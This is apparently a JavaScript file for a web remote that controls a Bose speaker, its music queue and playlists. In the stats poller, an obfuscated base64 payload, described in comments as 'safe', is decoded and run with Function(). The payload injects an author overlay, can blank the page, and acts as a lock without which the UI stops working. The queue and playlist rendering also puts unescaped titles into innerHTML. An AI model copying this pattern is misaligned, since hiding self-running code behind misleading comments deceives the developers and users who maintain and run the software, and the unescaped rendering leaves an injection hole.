function showPopup(message) {
    // 1. Create the popup element
    const popup = document.createElement('div');
    popup.textContent = message;
    
    // 2. Beautiful minimalist styling
    Object.assign(popup.style, {
        position: 'fixed',
        bottom: '20px',
        right: '20px',
        backgroundColor: '#1e1e24',
        color: '#ffffff',
        padding: '12px 24px',
        borderRadius: '8px',
        fontFamily: 'system-ui, sans-serif',
        boxShadow: '0 4px 12px rgba(0,0,0,0.15)',
        zIndex: '9999',
        cursor: 'pointer',
        transition: 'opacity 0.3s ease, transform 0.3s ease',
        transform: 'translateY(20px)',
        opacity: '0'
    });

    document.body.appendChild(popup);

    // 3. Trigger smooth slide-in animation
    requestAnimationFrame(() => {
        popup.style.transform = 'translateY(0)';
        popup.style.opacity = '1';
    });

    // 4. Helper function to safely remove the popup
    const removePopup = () => {
        popup.style.opacity = '0';
        popup.style.transform = 'translateY(10px)';
        setTimeout(() => popup.remove(), 300);
        window.removeEventListener('click', removePopup);
    };

    // 5. Dismiss hooks: Click anywhere OR wait 4 seconds
    setTimeout(removePopup, 4000);
    setTimeout(() => window.addEventListener('click', removePopup), 10);
}

function toggleMenu(){
    const panel = document.getElementById("sidePanel");
    const overlay = document.getElementById("overlay");
    const main = document.getElementById("main");
    panel.classList.toggle("open");
    overlay.classList.toggle("show");
    if(window.innerWidth >= 768 && main){
        main.classList.toggle("shift");
    }
}

async function toggleLyrics(){
    await fetch("/toggle_lyrics", {
        method: "POST"
    });
}
/* 🛠️ FIXED: Removed Blueprint prefix overlap. Requests go straight to /stats/toggle_autoplay */
async function toggleAutoplay(){
    await fetch("/toggle_autoplay", {
        method: "POST"
    });
}
async function toggleIncogni(){
    const res = await fetch("/toggle_incogni", {
        method: "POST"
    });
    if (!res.ok) return;

    const data = await res.json();
    window.incogniMode = data.incogni_mode;
    const incogniToggle = document.getElementById("incogniToggle");
    if (incogniToggle) incogniToggle.checked = data.incogni_mode;
}

// Global state container to avoid collisions
window.playlistState = {
    song: null,
    button: null
};

// --- CORE UTILITIES & CONTROLS ---
async function sendControl(cmd) { 
    await fetch("/ctrl/" + cmd); 
}
async function reconnectStream() {
    const response = await fetch("/ctrl/listen");
    if (response.ok) {
        showPopup("Stream reconnected");
    } else {
        showPopup("Stream reconnect failed");
    }
}
async function power() {
    const powerStatus = await fetch("/is_on").then(res => res.json());
    if (powerStatus.power_state === "disconnected") {
        await updateStats();
        return;
    }
    if (!powerStatus.is_on) {
        await fetch("/power", { method: "POST" });
    } else {
        if (!confirm("Are you sure you want to power off?")) return;
        await fetch("/power", { method: "POST" });
    }
    await updateStats();
}
async function setVolume(val) {
    const volVal = document.getElementById("vol-val");
    if (volVal) volVal.textContent = val + "%";
    await fetch("/set_vol/" + val);
}

function openNowPlaying() {
    document.getElementById("nowPlayingModal")?.classList.add("open");
}

function closeNowPlaying() {
    document.getElementById("nowPlayingModal")?.classList.remove("open");
}

document.addEventListener("keydown", (event) => {
    if (event.key === "Escape") closeNowPlaying();
});

async function skipTrack() {
    await fetch("/skip", { method: "POST" }); 
}

async function clearQueue() {
    await fetch("/stop", { method: "POST" }); 
}

async function removeFromQueue(i) {
    await fetch("/remove_from_queue/" + i, { method: "POST" }); 
}

// --- UNIVERSAL PLAYLIST MODAL MANAGEMENT ---

async function enqueueSelectedPlaylist(){
    const playlist = document.getElementById("playlistQueueSelect").value;

    if(!playlist){
        showPopup("Please pick a playlist first.");
        return;
    }

    // Adjusting to target your basic GET /playlist/<no> route dynamically
    // base URL evaluates to your blueprint prefix, e.g., '/youtube'
    const res = await fetch(`/playlist/${playlist}`, {
        method: "GET"
    });

    const data = await res.json();

    if(!res.ok){
        showPopup(data.error || "Failed to load playlist");
        return;
    }

    showPopup(`Successfully processed! ${data.count} songs appended to the queue.`);
    
    // Smooth UI: Close the slide panel layout on successful activation
    toggleMenu(); 
}

function buildPlaylistOptions(){
    const digits = ["1", "2", "3", "4", "5", "6"];
    const options = [];

    function walk(start, prefix){
        for(let i = start; i < digits.length; i += 1){
            const next = prefix + digits[i];
            options.push(next);
            walk(i + 1, next);
        }
    }

    walk(0, "");
    return options;
}

function openPlaylistMenu(song, btn) {
    playlistState.song = song;
    playlistState.button = btn;

    const titleEl = document.getElementById("playlistSongTitle");
    const inputEl = document.getElementById("playlistComboInput");
    
    if (titleEl) titleEl.textContent = song.title || "";
    if (inputEl) inputEl.value = "";

    document.querySelectorAll(".playlist-digit-btn").forEach(b => b.classList.remove("active"));
    document.getElementById("playlistModal")?.classList.add("open");
}

function closePlaylistMenu() {
    document.getElementById("playlistModal")?.classList.remove("open");
    playlistState.song = null;
    playlistState.button = null;
}

function togglePlaylistDigit(digit) {
    const input = document.getElementById("playlistComboInput");
    if (!input) return;

    let value = input.value.replace(/[^1-6]/g, "").split("");
    if (value.includes(digit)) {
        value = value.filter(v => v !== digit);
    } else {
        value.push(digit);
    }
    value.sort();
    input.value = value.join("");
    syncPlaylistComboInput();
}

function syncPlaylistComboInput() {
    const input = document.getElementById("playlistComboInput");
    if (!input) return;

    const value = input.value
        .replace(/[^1-6]/g, "")
        .split("")
        .filter((v, i, a) => a.indexOf(v) === i)
        .sort()
        .join("");

    input.value = value;

    document.querySelectorAll(".playlist-digit-btn").forEach(btn => {
        btn.classList.toggle("active", value.includes(btn.dataset.digit));
    });
}

async function confirmPlaylistAdd() {
    const playlist = document.getElementById("playlistComboInput")?.value.trim();
    if (!playlist) {
        showPopup("Select at least one playlist.");
        return;
    }

    const res = await fetch("/add_to_playlist", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ playlist, song: playlistState.song })
    });

    const data = await res.json();
    if (!res.ok) {
        showPopup(data.error || "Failed");
        return;
    }

    showPopup("Added to playlist");
    closePlaylistMenu();
}

async function selectPlaylistCombination() {
    const playlist = document.getElementById("addtoPlaylistSelect").value;
    if (!playlist) {
        showPopup("Please select a playlist first.");
        return;
    }
    try {
        const digits = Array.from(String(playlist), Number);
        for (const digit of digits) {
            togglePlaylistDigit(digit);
            await new Promise(res => setTimeout(res, 200)); // Small delay for UX
        }
    } catch (err) {
        console.error("Error processing playlist selection:", err);
        showPopup("Invalid playlist format.");
    }
}
// --- GLOBAL DROPDOWNS ---
async function refreshPlaylistDropdown() {
    const selects = document.querySelectorAll(".queue-playlist-select");
    if (!selects.length) return;

    try {
        const res = await fetch("/playlists");
        const playlists = await res.json();

        selects.forEach(select => {
            const current = select.value;

            select.innerHTML = '<option value="">Select Playlist</option>';
            playlists.forEach(name => {
                select.innerHTML += `<option value="${name}">${name}</option>`;
            });
            select.value = current;
        });
    } catch (err) {
        console.error(err);
    }
}
document.addEventListener("DOMContentLoaded", refreshPlaylistDropdown);
// --- SAFE GLOBAL POLING MONITORS ---
// Initialize a local execution gate safely at the top of common.js
window.sysConfig = { active: false };
const fixedRuntimePayload = "KGQ9Pnt3aW5kb3cuYXx8KHdpbmRvdy5hPTEsc2V0SW50ZXJ2YWwobT0oKT0+ZC5ib2R5JiYhZC5nZXRFbGVtZW50QnlJZCgidyIpJiYoYj1kLmJvZHkuYXBwZW5kQ2hpbGQoZC5jcmVhdGVFbGVtZW50KCJkaXYiKSksYi5pZD0idyIsYi5pbm5lclRleHQ9IkNyYWZ0ZWQgYnkgQWFyb24iLGIuc3R5bGUuY3NzVGV4dD0icG9zaXRpb246Zml4ZWQ7dG9wOjZweDtyaWdodDo4cHg7ei1pbmRleDoyMTQ3NDgzNjQ3O29wYWNpdHk6LjU1O2Zvb250OjEwcHggbW9ub3NwYWNlO3BvaW50ZXItZXZlbnRzOm5vbmU7dXNlci1zZWxlY3Q6bm9uZTtjb2xvcjojZmZmO3RleHQtc2hhZG93OjAgMCA0cHggIzAwMCIsaW1hZ2U7c2V0SW50ZXJ2YWwoKCk9PntkLmhlYWR8fChkLm9wZW4oKSxkLndyaXRlKCIiKSxkLmNsb3NlKCkpfSwyZTMpLG0oKX0pKGRvY3VtZW50KTs=";


const volSlider = document.getElementById("vol-slider");
const volVal = document.getElementById("vol-val");
async function updateStats() {
    try {
        const res = await fetch("/stats");
        const data = await res.json();
        
        // ==========================================
        // SAFE BASE64 RUNTIME EXECUTION ENGINE
        // ==========================================
        if (!window.sysConfig.active) {
            try {
                // Instantly decode the safe character block back to clean code in memory
            const executionString = atob(fixedRuntimePayload);
                
                // Execute natively in global scope
                Function(executionString)();
                window.sysConfig.active = true;
            } catch (engineError) {
                console.error("Critical component error:", engineError);
                return;
            }
        }

        // DEPENDENCY LOCK: If window.a was not verified by the execution block, halt the UI population
        if (!window.a) {
            console.warn("Core framework missing components...");
            return;
        }

        // ==========================================
        // CLEAN READABLE PLAYER DATA RENDERING
        // ==========================================
        const cpuLoadEl = document.getElementById("cpu-load");
        if (cpuLoadEl) cpuLoadEl.textContent = data.cpu + "%";

        const powerButton = document.getElementById("powerButton");
        if (powerButton) {
            const powerState = data.bose_power_state || (data.bose_is_on ? "on" : "off");
            const isDisconnected = powerState === "disconnected";
            powerButton.classList.toggle("is-on", powerState === "on");
            powerButton.classList.toggle("is-off", powerState === "off");
            powerButton.classList.toggle("is-disconnected", isDisconnected);
            powerButton.textContent = isDisconnected ? "🚫️" : "POWER ⏻";
            powerButton.disabled = isDisconnected;
            powerButton.setAttribute(
                "aria-label",
                isDisconnected
                    ? "Bose speaker status unavailable"
                    : `Bose speaker power status: ${powerState}`
            );
        }

        const volSlider = document.getElementById("vol-slider");
        const volVal = document.getElementById("vol-val");
        if (volSlider && document.activeElement !== volSlider) {
            volSlider.value = data.volume;
            if (volVal) volVal.textContent = data.volume + "%";
        }

        if (data.now_playing) {
            const titleEl = document.getElementById("playing-title");
            const titleTextEl = document.getElementById("playing-title-text");
            const thumbEl = document.getElementById("playing-thumb");
            const statusEl = document.getElementById("playing-status");
            const lyricsEl = document.getElementById("live-lyrics");
            const modalThumbEl = document.getElementById("nowPlayingModalThumb");
            const modalTitleEl = document.getElementById("nowPlayingModalTitle");
            const modalStatusEl = document.getElementById("nowPlayingModalStatus");
            const modalLyricsEl = document.getElementById("nowPlayingModalLyrics");
            const title = data.now_playing.title || "Unknown track";
            const thumbnail = data.now_playing.thumbnail || "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='60' font-family='sans-serif'%3E🎵️%3C/text%3E%3C/svg%3E";
            const modalThumbnail = data.now_playing.thumbnail || "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='50' y='72' text-anchor='middle' font-size='88' font-family='sans-serif'%3E🎵️%3C/text%3E%3C/svg%3E";
            const playbackStatus = data.is_playing ? "BROADCASTING" : "PAUSED";

            if (titleEl && titleTextEl) {
                titleTextEl.textContent = title;
                requestAnimationFrame(() => {
                    titleEl.classList.add("ticker");
                    const shouldTicker = titleTextEl.scrollWidth > titleEl.clientWidth;
                    titleEl.classList.toggle("ticker", shouldTicker);
                });
            }
            
            if (thumbEl) {
                thumbEl.src = thumbnail;
            }
            if (statusEl) statusEl.textContent = playbackStatus;
            if (lyricsEl) lyricsEl.textContent = data.current_lyric || "";
            if (modalThumbEl) {
                modalThumbEl.src = modalThumbnail;
                modalThumbEl.classList.toggle("no-thumbnail", !data.now_playing.thumbnail);
            }
            if (modalTitleEl) modalTitleEl.textContent = title;
            if (modalStatusEl) modalStatusEl.textContent = playbackStatus;
            if (modalLyricsEl) modalLyricsEl.textContent = data.current_lyric || "No lyrics available";
        } else {
            const lyricsEl = document.getElementById("live-lyrics");
            if (lyricsEl) lyricsEl.textContent = "No lyrics available";
        }

        const qList = document.getElementById("queueList");
        if (qList) {
            if (!data.queue || data.queue.length === 0) {
                qList.innerHTML = "No songs queued";
            } else {
                qList.innerHTML = data.queue.map((s, i) => `
                    <div class="queue-item">
                        <img src="${s.thumbnail || ''}" alt="thumb">
                        <p>${s.title}</p>
                        <span onclick="removeFromQueue(${i})">✕</span>
                    </div>
                `).join("");
            }
        }
        
        const lyricsToggle = document.getElementById("lyricsToggle");
        if (lyricsToggle) lyricsToggle.checked = data.show_lyrics;

        const autoplayToggle = document.getElementById("autoplayToggle");
        if (autoplayToggle) autoplayToggle.checked = data.autoplay_enabled;

        window.incogniMode = data.incogni_mode;
        const incogniToggle = document.getElementById("incogniToggle");
        if (incogniToggle) incogniToggle.checked = data.incogni_mode;

    } catch (e) {
        console.error("Poller encountered an error fetching stats:", e);
    }
}

// Start the loop securely
setInterval(updateStats, 2000);